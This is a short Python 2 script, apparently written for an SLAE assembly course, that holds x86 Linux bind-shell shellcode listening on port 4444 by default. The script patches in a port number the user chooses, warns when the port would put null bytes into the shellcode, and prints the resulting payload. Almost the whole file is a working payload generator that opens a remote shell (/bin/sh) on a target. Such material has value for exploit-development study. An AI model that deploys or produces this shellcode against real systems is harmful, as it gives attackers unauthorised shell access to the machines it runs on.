#!/usr/bin/python
# Author: Ty Gast // SLAE-1461
# Bind shell, default port 4444

off_port_high = 24
off_port_low = 25

shellcode = ('\x31\xc0\x50\x40\x89\xc3\x50\x40\x50\x89\xe1\xb0\x66\xcd\x80\x89\xc6\x5b\x5a\xc1\xe2\x04\x66\xb8\x11\x5c\xc1\xe0\x10\xb0\x02\x50\x89\xe1\x52\x51\x56\x89\xe1\x31\xc0\xb0\x66\xcd\x80\x89\x44\x24\x04\xb0\x66\xb3\x04\xcd\x80\x43\xb0\x66\xcd\x80\x89\xc3\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80')

shellcode_ba = bytearray(shellcode)

def print_shellcode():
  print_shell = ''
  #for x in bytearray(shellcode):
  for x in shellcode_ba:
    print_shell += '\\x'
    print_shell += '%02x' % x
  print print_shell

def change_port(port):
  if (port & 0xff) == 0 or (port & 0xff00) == 0:
    print("WARNING: port " + str(port) + " puts null byte in the shellcode")
  if port != 4444:
    print("INFO: changing the port to " + str(port))
    print("INFO: Shellcode size: %d bytes" % len(shellcode_ba) )
    high = chr((port & 0xff00) >> 8)
    low = chr(port & 0xff)
    shellcode_ba[off_port_high] = high
    shellcode_ba[off_port_low] = low

try:
  newport = input("Enter port to listen on (enter to accept default 4444): ")
except:
  print ("INFO: using the default port 4444")
  newport = 4444

if newport < 1 or newport > 65535:
  print ("ERROR: Invalid port selected, must be between 1 and 65535")
else:
  change_port(newport)
  print_shellcode()

